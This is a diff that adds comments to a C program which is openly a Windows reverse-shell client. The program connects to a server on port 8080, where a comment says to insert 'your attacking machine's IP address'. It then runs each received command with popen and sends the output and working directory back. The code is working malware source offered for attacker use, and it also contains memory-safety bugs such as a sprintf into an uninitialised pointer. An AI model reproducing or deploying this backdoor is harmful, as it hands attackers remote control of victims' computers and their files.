@@ -13,16 +13,16 @@ void receiveCommand(SOCKET client_socket, char *rsp);
 
 int main(){
     
-    char cmd_buff[1024];
-    char output_buff[1024]; 
-    char cwd[1024];
+    char cmd_buff[1024];        // buffer that stores the command sent by the server
+    char output_buff[1024];     // buffer that stores the output of the command
+    char cwd[1024];             // buffer that stores the current working directory
     FILE *output;
 
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8080);
-    const char* server_ip = "127.0.0.1";
+    const char* server_ip = "127.0.0.1";    // Replace this with your attacking machine's IP address
 
     startWinsock();
     client_socket = startSocket();
@@ -30,7 +30,8 @@ int main(){
         printf("Waiting for connection...");
         Sleep(1000);
     }
-
+    
+    // get the current working directory and send it to the server
     getcwd(cwd, 1024);
     sendMsg(client_socket, cwd);
 
@@ -43,27 +44,31 @@ int main(){
         char cmd_buff_copy[1024];
         strcpy(cmd_buff_copy, cmd_buff);
         char* cmd_arg1 = strtok(cmd_buff_copy, " ");
+
         if (strcmp(cmd_arg1, "cd") == 0){
             // code for if the command was cd
+            // switch to the new working directory and send it to the server
             strcpy(cwd, &cmd_buff[3]);
             chdir(cwd);
             getcwd(cwd, 1024);
             strcat(output_buff, "\n");
             strcat(output_buff, "cURR_dIR");
             strcat(output_buff, cwd);
+
         } else {
             // code for any other command aside from cd
             output = popen(cmd_buff, "r"); 
             if (output != NULL){
+                // read each line of output and send it to the server
                 while(1){
                     char line[1024];
                     char* read = fgets(line, 1024, output); 
                     if (!read){
-                        break;
+                        break;  // stop reading the output if there is no longer any output
                     }
                     sendMsg(client_socket, line);
                 }
-            } else {
+            } else {    // execute this code if an error happened when executing the command
                 printf("Error executing command.\n");
                 char* err_msg;
                 sprintf(err_msg, "Error executing the command %s \n", cmd_buff);
@@ -71,8 +76,9 @@ int main(){
             }
             
             getcwd(cwd, 1024);
-            strcat(output_buff, "cURR_dIR");
+            strcat(output_buff, "cURR_dIR"); 
             strcat(output_buff, cwd);
+            // "cURR_dIR" is the string that separates our command's ouput from the current working directory
         }
         sendMsg(client_socket, output_buff);
         pclose(output);
